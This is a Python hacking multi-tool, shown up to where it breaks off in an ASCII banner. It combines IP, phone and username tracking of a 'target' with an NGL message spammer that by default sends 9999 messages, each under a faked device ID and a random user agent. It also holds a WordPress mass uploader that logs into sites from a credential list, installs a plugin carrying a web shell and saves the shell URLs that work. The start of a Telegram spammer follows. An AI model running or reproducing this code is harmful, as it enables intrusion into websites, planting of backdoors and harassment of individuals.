import json
import requests
import time
import os
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from sys import stderr
import sys
import random
import string
import logging
from dotenv import load_dotenv
from fake_useragent import UserAgent
import re
import datetime
from colorama import Fore, Style, init
from pprint import pprint
import threading
from urllib.parse import urlparse

# Initialize colorama
init(autoreset=True)

# Color definitions
Bl = '\033[30m'  
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'
z = '\033[0m'

# Colorama colors
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT
m = Re
k = Fore.YELLOW
#================================
# Decorator function
def is_option(func):
    def wrapper(*args, **kwargs):
        run_banner()
        func(*args, **kwargs)
    return wrapper
#================================
# 1. IP TRACKER
@is_option
def IP_Track():
    ip = input(f"{Wh}\n Enter IP target : {Gr}")  
    print()
    print(f' {Wh}============= {Gr}SHOW INFORMATION IP ADDRESS {Wh}=============')
    try:
        req_api = requests.get(f"http://ipwho.is/{ip}")  
        ip_data = json.loads(req_api.text)
        time.sleep(2)
        print(f"{Wh}\n IP target       :{Gr}", ip)
        print(f"{Wh} Type IP         :{Gr}", ip_data["type"])
        print(f"{Wh} Country         :{Gr}", ip_data["country"])
        print(f"{Wh} Country Code    :{Gr}", ip_data["country_code"])
        print(f"{Wh} City            :{Gr}", ip_data["city"])
        print(f"{Wh} Continent       :{Gr}", ip_data["continent"])
        print(f"{Wh} Continent Code  :{Gr}", ip_data["continent_code"])
        print(f"{Wh} Region          :{Gr}", ip_data["region"])
        print(f"{Wh} Region Code     :{Gr}", ip_data["region_code"])
        print(f"{Wh} Latitude        :{Gr}", ip_data["latitude"])
        print(f"{Wh} Longitude       :{Gr}", ip_data["longitude"])
        lat = int(ip_data['latitude'])
        lon = int(ip_data['longitude'])
        print(f"{Wh} Maps            :{Gr}", f"https://www.google.com/maps/@{lat},{lon},8z")
        print(f"{Wh} EU              :{Gr}", ip_data["is_eu"])
        print(f"{Wh} Postal          :{Gr}", ip_data["postal"])
        print(f"{Wh} Calling Code    :{Gr}", ip_data["calling_code"])
        print(f"{Wh} Capital         :{Gr}", ip_data["capital"])
        print(f"{Wh} Borders         :{Gr}", ip_data["borders"])
        print(f"{Wh} Country Flag    :{Gr}", ip_data["flag"]["emoji"])
        print(f"{Wh} ASN             :{Gr}", ip_data["connection"]["asn"])
        print(f"{Wh} ORG             :{Gr}", ip_data["connection"]["org"])
        print(f"{Wh} ISP             :{Gr}", ip_data["connection"]["isp"])
        print(f"{Wh} Domain          :{Gr}", ip_data["connection"]["domain"])
        print(f"{Wh} ID              :{Gr}", ip_data["timezone"]["id"])
        print(f"{Wh} ABBR            :{Gr}", ip_data["timezone"]["abbr"])
        print(f"{Wh} DST             :{Gr}", ip_data["timezone"]["is_dst"])
        print(f"{Wh} Offset          :{Gr}", ip_data["timezone"]["offset"])
        print(f"{Wh} UTC             :{Gr}", ip_data["timezone"]["utc"])
        print(f"{Wh} Current Time    :{Gr}", ip_data["timezone"]["current_time"])
    except Exception as e:
        print(f"{Re}Error: {e}")
#================================
# 2. PHONE NUMBER TRACKER
@is_option
def phoneGW():
    User_phone = input(f"\n {Wh}Enter phone number target {Gr}Ex [+6281xxxxxxxxx] {Wh}: {Gr}")  
    default_region = "ID"  

    try:
        parsed_number = phonenumbers.parse(User_phone, default_region)  
        region_code = phonenumbers.region_code_for_number(parsed_number)
        jenis_provider = carrier.name_for_number(parsed_number, "en")
        location = geocoder.description_for_number(parsed_number, "id")
        is_valid_number = phonenumbers.is_valid_number(parsed_number)
        is_possible_number = phonenumbers.is_possible_number(parsed_number)
        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region, with_formatting=True)
        number_type = phonenumbers.number_type(parsed_number)
        timezone1 = timezone.time_zones_for_number(parsed_number)
        timezoneF = ', '.join(timezone1)

        print(f"\n {Wh}========== {Gr}SHOW INFORMATION PHONE NUMBERS {Wh}==========")
        print(f"\n {Wh}Location             :{Gr} {location}")
        print(f" {Wh}Region Code          :{Gr} {region_code}")
        print(f" {Wh}Timezone             :{Gr} {timezoneF}")
        print(f" {Wh}Operator             :{Gr} {jenis_provider}")
        print(f" {Wh}Valid number         :{Gr} {is_valid_number}")
        print(f" {Wh}Possible number      :{Gr} {is_possible_number}")
        print(f" {Wh}International format :{Gr} {formatted_number}")
        print(f" {Wh}Mobile format        :{Gr} {formatted_number_for_mobile}")
        print(f" {Wh}Original number      :{Gr} {parsed_number.national_number}")
        print(f" {Wh}E.164 format         :{Gr} {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)}")
        print(f" {Wh}Country code         :{Gr} {parsed_number.country_code}")
        print(f" {Wh}Local number         :{Gr} {parsed_number.national_number}")
        if number_type == phonenumbers.PhoneNumberType.MOBILE:
            print(f" {Wh}Type                 :{Gr} This is a mobile number")
        elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
            print(f" {Wh}Type                 :{Gr} This is a fixed-line number")
        else:
            print(f" {Wh}Type                 :{Gr} This is another type of number")
    except Exception as e:
        print(f"{Re}Error: {e}")

#================================
# 3. USERNAME TRACKER
@is_option
def TrackLu():
    try:
        username = input(f"\n {Wh}Enter Username : {Gr}")
        results = {}
        social_media = [
            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
            {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
            {"url": "https://www.youtube.com/{}", "name": "Youtube"},
            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
            {"url": "https://www.behance.net/{}", "name": "Behance"},
            {"url": "https://www.medium.com/@{}", "name": "Medium"},
            {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
            {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
            {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
            {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
            {"url": "https://www.ello.co/{}", "name": "Ello"},
            {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.telegram.me/{}", "name": "Telegram"},
            {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
        ]
        for site in social_media:
            url = site['url'].format(username)
            response = requests.get(url)
            if response.status_code == 200:
                results[site['name']] = url
            else:
                results[site['name']] = (f"{Ye}Username not found {Ye}!")
    except Exception as e:
        print(f"{Re}Error : {e}")
        return

    print(f"\n {Wh}========== {Gr}SHOW INFORMATION USERNAME {Wh}==========")
    print()
    for site, url in results.items():
        print(f" {Wh}[ {Gr}+ {Wh}] {site} : {Gr}{url}")

#================================
# 4. SHOW YOUR IP
@is_option
def showIP():
    respone = requests.get('https://api.ipify.org/')
    Show_IP = respone.text
    
    print(f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
        """)
    print(f"\n {Wh}========== {Gr}SHOW INFORMATION YOUR IP {Wh}==========")
    print(f"\n {Wh}[{Gr} + {Wh}] Your IP Adrress : {Gr}{Show_IP}")
    print(f"\n {Wh}==============================================")

#================================
# 5. PHONE INFO
@is_option
def phone_info():
    def banner():
        print(f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
        """)

    banner()
    number = input('\33[m[\033[93m•\33[m] MASUKKAN NOMER TELEPON ( 62 ): \x1b[1;92m')
    try:
        output = requests.get(f'http://phone-number-api.com/json/?number={number}').text
        obj = json.loads(output)

        query = obj['query']
        status = obj['status']
        numberType = obj['numberType']
        numberCountryCode = obj['numberCountryCode']
        numberAreaCode = obj['numberAreaCode']
        ext = obj['ext']
        dialFromCountryCode = obj['dialFromCountryCode']
        carrier = obj['carrier']
        continent = obj['continent']
        continentCode = obj['continentCode']
        country = obj['country']
        countryName = obj['countryName']
        lat = obj['lat']
        lon = obj['lon']
        timezone = obj['timezone']
        offset = obj['offset']
        currency = obj['currency']

        print('[+] Information Output')
        print('--------------------------------------')
        print(' - Phone number:', query)
        print(' - Status:', status)
        print(' - Number type:', numberType)
        print(' - Number Country Code:', numberCountryCode)
        print(' - Number Area Code:', numberAreaCode)
        print(' - ext:', ext)
        print(' - dial country:', dialFromCountryCode)
        print(' - carrier:', carrier)
        print(' - continent:', continent)
        print(' - continent code:', continentCode)
        print(' - country:', country)
        print(' - countryname:', countryName)
        print(' - Latitude:', lat)
        print(' - Longitude:', lon)
        print(' - timezone:', timezone)
        print(' - offset:', offset)
        print(' - currency:', currency)
    except Exception as e:
        print(f"{Re}Error: {e}")

#================================
# 6. NGL SPAMMER
@is_option
def ngl_spammer():
    logging.basicConfig(level=logging.INFO, format='[%(asctime)s - %(levelname)s] %(message)s')

    class RequestSender:
        def __init__(self, url):
            if not url:
                logging.error("URL must be provided")
                sys.exit(1)
            self.url = url
            self.user_agent = UserAgent()

        def send_request(self, username, question, device_id, game_slug='', referrer=''):
            headers = self._generate_headers(username)
            data = {
                'username': username,
                'question': question,
                'deviceId': device_id,
                'gameSlug': game_slug,
                'referrer': referrer
            }
            try:
                response = requests.post(self.url, headers=headers, data=data)
                response.raise_for_status()  
            except requests.exceptions.HTTPError as e:
                logging.error(f"HTTP Error: {e}")
                return None
            except requests.exceptions.RequestException as e:
                logging.error(f"Request Failed: {e}")
                return None
            return response

        def send_request_with_retry(self, username, question, device_id, game_slug='', referrer='', max_retries=3):
            retries = 0
            while retries < max_retries:
                response = self.send_request(username, question, device_id, game_slug, referrer)
                if response is None:
                    logging.info("Request failed, retrying...")
                    retries += 1
                    time.sleep(2)
                    continue

                if response.status_code == 404:
                    logging.error("HTTP Error 404: Not Found. Stopping the program.")
                    sys.exit(1)

                if response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 10))
                    logging.info(f"Rate limited. Retrying after {retry_after} seconds...")
                    time.sleep(retry_after)
                    retries += 1
                    continue

                return response

            logging.error("Max retries reached. Failed to send request.")
            return None

        def _generate_headers(self, username):
            return {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Dnt': '1',
                'Referer': f'https://ngl.link/{username}',
                'Sec-Ch-Ua': random.choice(['"Microsoft Edge";v="123"', '"Not:A-Brand";v="8"', '"Chromium";v="123"']),
                'Sec-Ch-Ua-Mobile': random.choice(['?0', '?1']),
                'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"Linux"', '"Macintosh"', '"Android"', '"iOS"']),
                'User-Agent': self.user_agent.random
            }

    class DeviceIDGenerator:
        @staticmethod
        def generate_device_id():
            return '-'.join([''.join(random.choices(string.ascii_lowercase + string.digits, k=part_length))
                             for part_length in [8, 4, 4, 4, 12]])

    load_dotenv()
    url = "https://ngl.link/api/submit"
    if not url:
        logging.error("No URL provided in environment. Exiting.")
        sys.exit(1)
    pesan = '''
    For better experience, please use a valid username.
    '''
    print(pesan)
    request_sender = RequestSender(url)
    username = input("Enter target username: ").strip()
    if not username:
        logging.error("Username is required. Exiting.")
        sys.exit(1)

    spam_choice = input("Do you want to spam? (yes/no): ").lower().strip()
    if spam_choice not in ["yes", "no", "y", "n", ""]:
        logging.error("Invalid choice for spam. Exiting.")
        sys.exit(1)

    message_input = input("Enter your message or leave blank to use a default message: ") or " "
    if spam_choice in ["yes", "y", ""]:
        spam_count = input("How many times do you want to spam? (Default is 9999): ")
        spam_count = int(spam_count) if spam_count.isdigit() else 9999
        device_generator = DeviceIDGenerator()

        count_format = f'{{:0{len(str(spam_count))}d}}'

        for i in range(spam_count):
            device_id = device_generator.generate_device_id()
            response = request_sender.send_request_with_retry(username, message_input, device_id)
            if response:
                try:
                    response_data = response.json()
                    question_id = response_data.get("questionId", "Unknown ID")
                    user_region = response_data.get("userRegion", "Unknown Region")
                    logging.info(f"[{count_format.format(i+1)} of {count_format.format(spam_count)}] {response.status_code}:{response.reason} {user_region} {username.upper()} -> '{message_input}'")
                except ValueError:
                    logging.error("Failed to decode JSON from response.")
            else:
                logging.error("Failed to send message.")
    else:
        device_id = os.getenv("DEVICE_ID") or DeviceIDGenerator.generate_device_id()
        response = request_sender.send_request_with_retry(username, message_input, device_id)
        if response:
            try:
                response_data = response.json()
                question_id = response_data.get("questionId", "Unknown ID")
                user_region = response_data.get("userRegion", "Unknown Region")
                logging.info(f'Response: {response.status_code} - {user_region} -> {question_id}')
            except ValueError:
                logging.error("Failed to decode JSON from response.")
        else:
            logging.error("Failed to send message.")

#================================
# 7. WORDPRESS UPLOADER
@is_option
def wp_uploader():
    if(len(sys.argv) != 2):
        path = str(sys.argv[0]).split('\\')
        print(f'  [!] Enter <{path[len(path)-1]}> <wordpress.txt> \n      The list must be (http://domain.com/wp-login.php#username@password)')
        return

    if os.path.isfile(sys.argv[1]):
        sites = open(sys.argv[1], 'r')
        file = str(input(f'{fy}{sb} Put Your Zipped File (UBH) : '))
        if os.path.isfile(file):
            if '.zip' in file:
                pluginname = str(input(f'{fo}{sb} [+] Your Plugin Name ex: (ubh) : '))
                shellnamezip = str(input(f'{fy}{sb} [#] Shell Script : '))
            findString = str(input(f'{fc}{sb} [:=>] Name Of Your Shell (String) : '))
            print('')
            for site in sites:
                try:
                    site = site.strip()
                    req = requests.session()
                    pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
                    if re.findall(pLogin, site):
                        dataLogin = re.findall(pLogin, site)
                        domain = 'http' + dataLogin[0][0]
                        user = dataLogin[0][1]
                        password = dataLogin[0][2]
                        print(f"{fc}{sb} [*] Site : " + domain + "/")
                        print(f" [*] Username : " + user)
                        print(f" [*] Password : " + password)
                        pattern = re.compile('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"')
                        post = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': domain + '/wp-admin/', 'testcookie': '1'}
                        try:
                            login = req.post(domain + '/wp-login.php', data=post, timeout=30)
                        except:
                            print(' [-]' + f'{fr} Time Out \n')
                            invalid = open('invalid.txt', 'a')
                            invalid.write(site + "\n")
                            invalid.close()
                            continue
                        check = req.get(domain + '/wp-admin', timeout=60)
                        if 'profile.php' in check.text:
                            print(' [+]' + f"{fg} Successful login")
                            plugin_install_php = req.get(domain + '/wp-admin/plugin-install.php?tab=upload', timeout=60)
                            if re.findall(pattern, plugin_install_php.text):
                                id = re.findall(pattern, plugin_install_php.text)
                                id = id[0]
                                update_php = domain + '/wp-admin/update.php?action=upload-plugin'
                                shellname = open(file, 'rb')
                                filename = file
                                filedata = {'_wpnonce': id, '_wp_http_referer': '/wp-admin/plugin-install.php', 'install-plugin-submit': 'Install Now'}
                                if '.zip' in file:
                                    fileup = {'pluginzip': (filename, shellname, 'multipart/form-data')}
                                else:
                                    fileup = {'pluginzip': (filename, shellname)}
                                Cherryreq = req.post(update_php, data=filedata, files=fileup, timeout=60)
                                if '.zip' in file:
                                    shell = domain + '/wp-content/plugins/' + pluginname + '/' + shellnamezip
                                    check_plugin_shell = requests.get(shell, timeout=60)
                                    if findString in check_plugin_shell.text:
                                        print(" [+] " + shell + ' =>' + f'{fg} Successful upload\n')
                                        shellsFile = open('shells.txt', 'a')
                                        shellsFile.write(shell + "\n")
                                        shellsFile.close()
                                    else:
                                        print(" [-]" + f"{fr} Failed upload\n")
                                        upUP = open('unUP.txt', 'a')
                                        upUP.write(site + "\n")
                                        upUP.close()
                            else:
                                print(" [-]" + f"{fr} Upload page not Working\n")
                                upUP = open('unUP.txt', 'a')
                                upUP.write(site + "\n")
                                upUP.close()
                        else:
                            print(' [-]' + f'{fr} Failed login \n')
                            invalid = open('invalid.txt', 'a')
                            invalid.write(site + "\n")
                            invalid.close()
                    else:
                        print("  Error in list !\n  Must be : http://domain.com/wp-login.php#username@password")
                except:
                    site = site.strip()
                    print(' [-]' + f'{fr} Time Out \n')
                    invalid = open('invalid.txt', 'a')
                    invalid.write(site + "\n")
                    invalid.close()
                    continue
        else:
            print("       File does not exist !")
            sys.exit(0)
    else:
        print("      " + sys.argv[1] + " does not exist !")
        sys.exit(0)

#================================
# 8. TELEGRAM SPAMMER
@is_option
def telegram_spammer():
    def banner():
        os.system("cls" if os.name == "nt" else "clear")
        print(f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
